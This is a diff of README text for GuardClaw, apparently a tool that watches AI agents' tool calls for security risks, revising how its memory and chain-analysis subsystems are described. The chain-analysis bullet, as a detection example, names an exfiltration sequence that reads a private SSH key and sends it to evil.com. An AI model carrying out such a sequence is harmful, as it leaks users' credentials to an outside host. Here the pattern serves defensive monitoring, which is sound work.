@@ -134,8 +134,8 @@ Static checks for MCP configuration, secrets exposure, and agentic-risk patterns
 GuardClaw has four core subsystems. The short version:
 
 - **Two-Stage Judge.** A local judge model (via LM Studio / Ollama / MLX) scores every tool call. High-risk calls (score ≥ 8) escalate to a cloud judge (Claude) with richer context.
-- **Multi-Level Security Memory.** Four levels of memory (raw events → session brief → project context → global knowledge) designed to catch long-range attacks that unfold over hundreds of tool calls.
-- **Adaptive Memory & Chain Analysis.** Learns from your approve/deny decisions, tracks tool-call sequences per session, and flags multi-step exfiltration like `read ~/.ssh/id_rsa → curl evil.com`.
+- **Episodic Security Memory.** Raw per-session events and session briefs are kept as first-class evidence for long-range attacks; LLM-generated cross-session summaries are opt-in.
+- **Adaptive Memory & Chain Analysis.** Learns from approve/deny decisions as weak evidence, tracks tool-call sequences per session, and flags multi-step exfiltration like `read ~/.ssh/id_rsa → curl evil.com`.
 - **Active Intervention.** Injects safety guidance into the agent's context before risky calls, dual-channel approval (agent dialog + dashboard + optional Telegram/Discord/WhatsApp push), circuit breaker on repeated denials, credential scanning on tool output, prompt injection detection, skill security review, and DTrace syscall monitoring (macOS).
 
 #### Fast Paths (before the LLM)
